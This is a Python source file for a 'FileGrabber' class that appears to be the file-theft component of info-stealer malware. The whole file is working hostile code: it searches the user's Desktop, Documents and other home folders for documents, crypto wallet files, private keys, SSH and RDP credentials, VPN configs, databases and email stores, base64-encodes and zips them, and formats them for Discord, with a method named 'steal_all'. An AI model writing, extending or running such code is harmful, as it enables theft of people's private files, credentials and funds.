import os
import sys
import json
import base64
import shutil
import tempfile
import zipfile
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple

class FileGrabber:
    def __init__(self):
        self.temp_dir = tempfile.gettempdir()
        self.user_profile = os.path.expanduser("~")
        self.desktop = os.path.join(self.user_profile, "Desktop")
        self.documents = os.path.join(self.user_profile, "Documents")
        self.downloads = os.path.join(self.user_profile, "Downloads")
        self.pictures = os.path.join(self.user_profile, "Pictures")
        self.videos = os.path.join(self.user_profile, "Videos")
        self.music = os.path.join(self.user_profile, "Music")
        
    def get_search_directories(self):
        directories = [
            self.desktop,
            self.documents,
            self.downloads,
            self.pictures,
            self.videos,
            self.music
        ]
        
        # Add user profile directories
        if os.path.exists(self.user_profile):
            for item in os.listdir(self.user_profile):
                item_path = os.path.join(self.user_profile, item)
                if os.path.isdir(item_path) and not item.startswith('.'):
                    directories.append(item_path)
        
        # Filter existing directories
        existing_directories = [d for d in directories if os.path.exists(d)]
        
        return existing_directories
    
    def get_file_extensions(self, category=None):
        extensions = {
            "documents": [".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".csv", ".rtf", ".odt"],
            "images": [".jpg", ".jpeg", ".png", ".gif", ".bmp", ".svg", ".webp"],
            "videos": [".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv"],
            "audio": [".mp3", ".wav", ".flac", ".aac", ".ogg"],
            "archives": [".zip", ".rar", ".7z", ".tar", ".gz"],
            "databases": [".db", ".sqlite", ".sql", ".mdb", ".accdb"],
            "code": [".py", ".js", ".html", ".css", ".php", ".java", ".cpp", ".c", ".h"],
            "config": [".json", ".xml", ".yaml", ".yml", ".ini", ".cfg", ".conf"],
            "crypto": [".wallet", ".dat", ".key", ".pem", ".crt", ".cer"],
            "vpn": [".ovpn", ".conf"],
            "credentials": [".rdp", ".ssh", ".ppk", ".pem"],
            "browser": [".html", ".htm"],
            "email": [".pst", ".ost", ".eml", ".msg"]
        }
        
        if category:
            return extensions.get(category, [])
        
        # Return all extensions
        all_extensions = []
        for ext_list in extensions.values():
            all_extensions.extend(ext_list)
        
        return all_extensions
    
    def search_files(self, directories, extensions, max_size=5242880, max_files=100):
        found_files = []
        
        try:
            for directory in directories:
                if len(found_files) >= max_files:
                    break
                
                for root, dirs, files in os.walk(directory):
                    if len(found_files) >= max_files:
                        break
                    
                    # Skip system directories
                    dirs[:] = [d for d in dirs if d not in [
                        'AppData', 'Application Data', 'Windows', 'Program Files',
                        'Program Files (x86)', 'node_modules', '__pycache__',
                        '.git', '.svn', 'Temp', 'Cache', 'cache'
                    ]]
                    
                    # Limit depth
                    depth = root[len(directory):].count(os.sep)
                    if depth > 3:
                        continue
                    
                    for file in files:
                        if len(found_files) >= max_files:
                            break
                        
                        if any(file.lower().endswith(ext.lower()) for ext in extensions):
                            file_path = os.path.join(root, file)
                            
                            try:
                                file_size = os.path.getsize(file_path)
                                
                                if file_size <= max_size and file_size > 0:
                                    found_files.append({
                                        "path": file_path,
                                        "name": file,
                                        "size": file_size,
                                        "extension": os.path.splitext(file)[1].lower()
                                    })
                            except:
                                pass
        except:
            pass
        
        return found_files
    
    def read_file_data(self, file_path, max_size=5242880):
        try:
            file_size = os.path.getsize(file_path)
            
            if file_size <= max_size:
                with open(file_path, "rb") as f:
                    return f.read()
        except:
            pass
        
        return None
    
    def grab_files_by_category(self, category, max_files=20):
        extensions = self.get_file_extensions(category)
        directories = self.get_search_directories()
        
        found_files = self.search_files(directories, extensions, max_files=max_files)
        
        grabbed_files = []
        
        for file_info in found_files:
            file_data = self.read_file_data(file_info["path"])
            
            if file_data:
                grabbed_files.append({
                    "name": file_info["name"],
                    "path": file_info["path"],
                    "size": file_info["size"],
                    "extension": file_info["extension"],
                    "data": base64.b64encode(file_data).decode()
                })
        
        return grabbed_files
    
    def grab_specific_files(self, file_paths):
        grabbed_files = []
        
        for file_path in file_paths:
            if os.path.exists(file_path) and os.path.isfile(file_path):
                file_data = self.read_file_data(file_path)
                
                if file_data:
                    grabbed_files.append({
                        "name": os.path.basename(file_path),
                        "path": file_path,
                        "size": os.path.getsize(file_path),
                        "extension": os.path.splitext(file_path)[1].lower(),
                        "data": base64.b64encode(file_data).decode()
                    })
        
        return grabbed_files
    
    def grab_desktop_files(self, max_files=50):
        desktop_files = []
        
        if os.path.exists(self.desktop):
            try:
                for file in os.listdir(self.desktop):
                    file_path = os.path.join(self.desktop, file)
                    
                    if os.path.isfile(file_path):
                        file_size = os.path.getsize(file_path)
                        
                        if file_size <= 5242880:  # 5MB
                            file_data = self.read_file_data(file_path)
                            
                            if file_data:
                                desktop_files.append({
                                    "name": file,
                                    "path": file_path,
                                    "size": file_size,
                                    "extension": os.path.splitext(file)[1].lower(),
                                    "data": base64.b64encode(file_data).decode()
                                })
            except:
                pass
        
        return desktop_files[:max_files]
    
    def grab_documents_files(self, max_files=30):
        document_extensions = self.get_file_extensions("documents")
        
        if os.path.exists(self.documents):
            found_files = self.search_files([self.documents], document_extensions, max_files=max_files)
            
            grabbed_files = []
            
            for file_info in found_files:
                file_data = self.read_file_data(file_info["path"])
                
                if file_data:
                    grabbed_files.append({
                        "name": file_info["name"],
                        "path": file_info["path"],
                        "size": file_info["size"],
                        "extension": file_info["extension"],
                        "data": base64.b64encode(file_data).decode()
                    })
            
            return grabbed_files
        
        return []
    
    def create_zip_from_files(self, files, output_path=None):
        if output_path is None:
            output_path = os.path.join(self.temp_dir, f"grabbed_files_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
        
        try:
            with zipfile.ZipFile(output_path, "w", zipfile.ZIP_DEFLATED) as zipf:
                for file_info in files:
                    file_data = base64.b64decode(file_info.get("data", ""))
                    file_name = file_info.get("name", "unknown")
                    zipf.writestr(file_name, file_data)
            
            return output_path
        except:
            return None
    
    def format_files_for_discord(self, files, limit=50):
        formatted = []
        
        for file_info in files[:limit]:
            formatted.append({
                "name": file_info.get("name", ""),
                "path": file_info.get("path", ""),
                "size": file_info.get("size", 0),
                "extension": file_info.get("extension", "")
            })
        
        return formatted
    
    def get_files_summary(self, files):
        summary = {
            "total_files": len(files),
            "total_size": sum(f.get("size", 0) for f in files),
            "extensions": {}
        }
        
        for file_info in files:
            ext = file_info.get("extension", "unknown")
            summary["extensions"][ext] = summary["extensions"].get(ext, 0) + 1
        
        return summary
    
    def grab_all_files(self, categories=None, max_files_per_category=20):
        if categories is None:
            categories = ["documents", "crypto", "credentials", "config", "databases"]
        
        all_files = []
        
        for category in categories:
            grabbed = self.grab_files_by_category(category, max_files_per_category)
            all_files.extend(grabbed)
        
        # Add desktop files
        desktop_files = self.grab_desktop_files(30)
        all_files.extend(desktop_files)
        
        # Remove duplicates
        unique_files = []
        seen_paths = set()
        
        for file_info in all_files:
            if file_info["path"] not in seen_paths:
                seen_paths.add(file_info["path"])
                unique_files.append(file_info)
        
        return unique_files
    
    def steal_all(self):
        all_files = self.grab_all_files()
        
        return {
            "total_files": len(all_files),
            "files": all_files,
            "summary": self.get_files_summary(all_files)
        }

if __name__ == "__main__":
    grabber = FileGrabber()
    data = grabber.steal_all()
    print(f"Total files grabbed: {data['total_files']}")
    print(json.dumps(data['summary'], indent=2))